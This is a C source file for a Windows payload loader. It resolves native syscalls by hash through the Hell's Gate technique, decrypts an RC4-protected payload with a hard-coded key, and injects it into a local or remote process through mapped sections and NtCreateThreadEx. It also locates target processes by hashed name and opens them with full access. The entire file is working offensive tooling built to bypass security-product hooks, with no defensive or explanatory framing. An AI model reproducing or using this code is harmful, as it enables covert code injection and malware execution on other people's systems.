#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

unsigned char ProtectedKey[] = { 0x42, 0x95, 0xCA, 0x94, 0xBB, 0xED, 0x81, 0x24, 0x93, 0xD2, 0x5A, 0x1D, 0x78, 0x5D, 0x85, 0x9C };

// global `VX_TABLE` structure
VX_TABLE 	g_Sys = { 0 };

BOOL InitializeSyscalls() {

	// Get the PEB
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	// Get NTDLL module
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
	g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
	g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
	g_Sys.NtClose.uHash = NtClose_JOAA;
	g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
	g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;

	// Initialize the syscalls
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
		return FALSE;

	if (!ApiHashing())
		return FALSE;

	return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

	HANDLE          hSection = NULL;
	HANDLE          hThread = NULL;
	PVOID           pLocalAddress = NULL,
		pRemoteAddress = NULL,
		pExecAddress = NULL;
	NTSTATUS        STATUS = NULL;
	SIZE_T          sViewSize = NULL;
	LARGE_INTEGER   MaximumSize = {
		  .HighPart = 0,
		  .LowPart = sPayloadSize
	};

	DWORD           dwLocalFlag = PAGE_READWRITE;

	//--------------------------------------------------------------------------
	// Allocating local map view
	HellsGate(g_Sys.NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
#if DEBUG
		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	if (bLocal) {
		dwLocalFlag = PAGE_EXECUTE_READWRITE;
	}

	HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, 1, NULL, dwLocalFlag)) != 0) {
#if DEBUG
		PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

#if DEBUG
	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);
#endif

	//--------------------------------------------------------------------------
	// Writing the payload
	Rc4EncryptionViSystemFunc032(ProtectedKey, pPayload, KEY_SIZE, sPayloadSize);
	_memcpy(pLocalAddress, pPayload, sPayloadSize);
#if DEBUG
	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);
#endif

	//--------------------------------------------------------------------------
		// Allocating remote map view
	if (!bLocal) {

		HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
		if ((STATUS = HellDescent(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, 1, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
#if DEBUG
			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

#if DEBUG
		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);
#endif

	}

	//--------------------------------------------------------------------------
	// Executing the payload via thread creation
	pExecAddress = pRemoteAddress;
	if (bLocal) {
		pExecAddress = pLocalAddress;
	}
#if DEBUG
	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
#endif
	HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#if DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}
#if DEBUG
	PRINTA("[+] DONE \n");
	PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
#endif
	//--------------------------------------------------------------------------
	// Waiting for the thread to finish
	HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
	if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
#if DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	// Unmapping the local view
	HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
#if DEBUG
		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	// Closing the section handle
	HellsGate(g_Sys.NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
#if DEBUG
		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;
}

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

	ULONG					    uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
	PVOID					    pValueToFree = NULL;
	NTSTATUS				    STATUS = NULL;

	// This will fail with status = STATUS_INFO_LENGTH_MISMATCH, but that's ok, because we need to know how much to allocate (uReturnLen1)
	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}

	// Since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// Calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
	HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
	STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#if DEBUG
		PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	while (TRUE) {

		// Small check for the process's name size
		// Comparing the enumerated process name to what we want to target
		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
			// Opening a handle to the target process and saving it, then breaking
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// If NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// Moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// Freeing using the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Checking if we got the target's process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}